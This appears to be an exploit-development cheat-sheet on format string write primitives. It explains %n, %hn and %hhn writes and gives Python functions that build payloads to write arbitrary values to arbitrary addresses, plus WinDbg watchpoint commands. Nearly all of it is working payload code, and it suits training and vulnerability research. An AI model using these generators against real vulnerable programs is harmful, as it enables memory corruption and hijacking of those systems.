---
tags:
  - Advanced
  - Binary_Exploitation
  - Debugging
  - Exploitation
  - Format_String
  - Windows
---

## Format String Write Primitives
resources: [Exploiting Format String Vulnerabilities](https://crypto.stanford.edu/cs155old/cs155-spring08/papers/formatstring-1.2.pdf)

> Use %n format specifier to write arbitrary values to arbitrary addresses.

### Basic %n Write [Knowledge]
> How %n enables memory writes.

```text
%n writes the count of characters printed so far
to the address on the stack.

printf("AAAA%n", &count);
// count = 4 (length of "AAAA")
```

### Control Write Value
> Adjust character count to write specific values.

```python
# To write value 0x100 (256):
payload = b"A" * 256 + b"%n"

# Using width specifier (more efficient):
payload = b"%256x%n"  # Prints 256 chars then writes 256
```

### Write to Specific Address
> Place target address on stack, use positional %n.

```python
import struct

target_addr = 0x08049000
position = 7  # Stack position of our input

# Place address, then write to it
payload = struct.pack("<I", target_addr)
payload += f"%{position}$n".encode()
# Writes 4 (length of address) to target_addr
```

### Write Arbitrary DWORD
> Write specific 4-byte value.

```python
def write_dword(target_addr, value, position):
    """Write 4-byte value using %n"""
    # Value must account for address bytes we've already printed
    addr_len = 4

    # Adjust value for already-printed bytes
    chars_needed = value - addr_len
    if chars_needed < 0:
        chars_needed += 0x100000000  # Handle negative

    payload = struct.pack("<I", target_addr)
    payload += f"%{chars_needed}x%{position}$n".encode()
    return payload
```

### Write Using %hn (Half-Word)
> Write 2 bytes at a time for more control.

```python
def write_word(target_addr, value, position):
    """Write 2-byte value using %hn"""
    payload = struct.pack("<I", target_addr)
    # Calculate padding to reach desired value
    current = 4  # Already printed 4 bytes (address)
    needed = value - current
    if needed < 0:
        needed += 0x10000

    payload += f"%{needed}x%{position}$hn".encode()
    return payload
```

### Write DWORD Using Two %hn Writes
> Split DWORD into two half-word writes.

```python
def write_dword_hn(target_addr, value, position):
    """Write DWORD using two %hn writes"""
    low_word = value & 0xFFFF
    high_word = (value >> 16) & 0xFFFF

    # Two addresses: target and target+2
    payload = struct.pack("<I", target_addr)      # Position N
    payload += struct.pack("<I", target_addr + 2) # Position N+1

    # Calculate writes (accounting for 8 bytes already printed)
    writes = sorted([
        (low_word, position),
        (high_word, position + 1)
    ], key=lambda x: x[0])

    current = 8
    for val, pos in writes:
        needed = val - current
        if needed < 0:
            needed += 0x10000
        if needed > 0:
            payload += f"%{needed}x".encode()
        payload += f"%{pos}$hn".encode()
        current = val

    return payload
```

### Write Using %hhn (Single Byte)
> Most precise: write 1 byte at a time.

```python
def write_dword_hhn(target_addr, value, position):
    """Write DWORD using four %hhn writes"""
    # Extract individual bytes
    bytes_to_write = [
        (target_addr + 0, value & 0xFF),
        (target_addr + 1, (value >> 8) & 0xFF),
        (target_addr + 2, (value >> 16) & 0xFF),
        (target_addr + 3, (value >> 24) & 0xFF),
    ]

    # Place all 4 addresses first
    payload = b""
    for addr, _ in bytes_to_write:
        payload += struct.pack("<I", addr)

    # Sort by value to minimize padding
    sorted_writes = sorted(enumerate(bytes_to_write),
                          key=lambda x: x[1][1])

    current = 16  # 4 addresses * 4 bytes
    for orig_pos, (addr, val) in sorted_writes:
        needed = val - (current % 256)
        if needed <= 0:
            needed += 256
        payload += f"%{needed}x%{position + orig_pos}$hhn".encode()
        current += needed

    return payload
```

### Optimized Write Payload
> Minimize payload size.

```python
def optimized_write(target_addr, value, position):
    """Generate optimized format string write"""

    # Use %hhn for smallest payloads
    bytes_list = []
    for i in range(4):
        bytes_list.append((
            target_addr + i,
            (value >> (i * 8)) & 0xFF
        ))

    # Sort by byte value
    sorted_bytes = sorted(enumerate(bytes_list),
                         key=lambda x: x[1][1])

    # Build payload
    addresses = b"".join(struct.pack("<I", b[0]) for _, b in sorted_bytes)

    format_str = b""
    printed = len(addresses)

    for idx, (orig_idx, (addr, byte_val)) in enumerate(sorted_bytes):
        # Calculate chars needed
        target = byte_val
        needed = (target - printed) % 256

        if needed > 0:
            format_str += f"%{needed}c".encode()
            printed += needed

        format_str += f"%{position + idx}$hhn".encode()

    return addresses + format_str
```

### Write Multiple Values
> Overwrite multiple addresses in one payload.

```python
def multi_write(writes, position):
    """
    writes: list of (address, value) tuples
    Each write is a DWORD using %hhn
    """
    all_bytes = []
    addr_offset = 0

    for addr, value in writes:
        for i in range(4):
            all_bytes.append((
                addr + i,
                (value >> (i * 8)) & 0xFF,
                addr_offset + i
            ))
        addr_offset += 4

    # Build addresses section
    addresses = b"".join(struct.pack("<I", b[0]) for b in all_bytes)

    # Sort by value
    sorted_bytes = sorted(all_bytes, key=lambda x: x[1])

    # Build format string
    format_str = b""
    printed = len(addresses)

    for addr, byte_val, orig_pos in sorted_bytes:
        needed = (byte_val - printed) % 256
        if needed > 0:
            format_str += f"%{needed}c".encode()
            printed += needed
        format_str += f"%{position + orig_pos}$hhn".encode()

    return addresses + format_str
```

### Debug Format String Writes
> Verify writes in debugger.

```text
; Set watchpoint on target address
0:000> ba w4 <TargetAddress>

; Run and examine when hit
0:000> g
0:000> dd <TargetAddress> L1

; Check what value was written
```

### Common Mistakes [Knowledge]
> [!warning] Troubleshooting format string writes:
> - **Wrong position**: Input offset incorrect, writes to wrong address
> - **Byte order**: x86 is little-endian, bytes may seem reversed
> - **NULL in address**: %s terminates, %n may fail
> - **Overflow count**: Large padding values may cause issues

